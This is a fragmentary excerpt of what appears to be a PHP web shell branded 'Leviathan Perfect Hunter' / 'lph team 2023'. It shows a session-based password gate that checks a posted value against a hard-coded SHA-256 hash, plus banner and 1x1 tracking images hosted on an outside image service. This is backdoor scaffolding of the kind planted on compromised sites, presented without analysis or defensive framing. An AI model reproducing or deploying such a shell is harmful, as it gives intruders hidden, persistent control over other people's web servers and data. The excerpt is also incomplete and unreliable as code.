...
if (function_exists('session_start')) { session_start(); if (!isset($_SESSION['secretyt'])) { $_SESSION['secretyt'] = false; } if (!$_SESSION['secretyt']) { if (isset($_POST['pwdyt']) && hash('sha256', $_POST['pwdyt']) == '3f0b324f47d2903655d543ea52e1609aed95925196cbcf68c2bc5a49ec9d3afe') {
...
<center><img style="border-radius:100px;"width="500" height="250" alt="Leviathan Perfect Hunter" draggable="false" src="https://res.cloudinary.com/dh6r7xdb4/image/upload/v1739671300/Solid_black_rgbupx.png" /></center>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="1" height="1" alt="lph team 2023" draggable="false" src="https://res.cloudinary.com/dh6r7xdb4/image/upload/v1693689246/download_tjuelt.gif" /></td>
</tr>
<tr>
